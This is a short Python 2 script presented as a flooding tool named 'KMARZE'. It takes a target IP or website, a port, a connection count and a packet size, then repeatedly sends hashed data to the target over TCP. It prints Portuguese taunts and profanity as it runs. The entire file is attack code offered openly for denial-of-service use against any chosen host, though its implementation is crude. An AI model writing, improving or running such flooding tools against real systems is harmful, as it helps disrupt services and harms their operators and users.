import argparse, socket , os, time, hashlib
import sys

os.system('cls') ### For Windows
os.system('color 0a') 
#os.system('clear') ### For Linux / Unix

print '''
░█─▄▀ ░█▀▄▀█ ─█▀▀█ ░█▀▀█ ░█▀▀▀█ ░█▀▀▀ 
░█▀▄─ ░█░█░█ ░█▄▄█ ░█▄▄▀ ─▄▄▄▀▀ ░█▀▀▀ 
░█─░█ ░█──░█ ░█─░█ ░█─░█ ░█▄▄▄█ ░█▄▄▄
'''
print('Tool made by: Kmarze')

parser = argparse.ArgumentParser()
parser.add_argument('-i','--ip', help='Ip da maquina ou site alvo', required=True)
parser.add_argument('-p','--port', help='Porta para enviar putad / pacotes', required=True)
parser.add_argument('-c','--conections', help='Numero de requisicoes', required=True)
parser.add_argument('-s','--size', help='Tamanho de Putas / pacotes', required=True)
args = parser.parse_args()

size = (args.size)
ip = str(args.ip)
port = int(args.port)
pac = int(args.conections)

addr = ((ip,port))
socks = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
try:
    socks.connect_ex(addr)
    connected = 1
except socket.error:
    connected = 0
    print('Hostname could not be resolved')
i = 0
print('[*] Iniciando FilhaDaPutagem ...')
print ''
data = hashlib.sha512(size).hexdigest()
time.sleep(2.5)
errors = 0
while i < pac:
    i+=1
    try:
        socks.settimeout(0.03)
        socks.connect_ex(addr)
        socks.send(data)
        socks.send('\r\n\r\n')
        print('FilhaDaPutando: '+ip)
        print
    except socket.error:
        print('Conection Error')
        errors = errors + 1
print('[*] FilhaDaPutagem Terminada - vai te fude agora')
print
print('[-] '+str(errors)+ ' Errors')
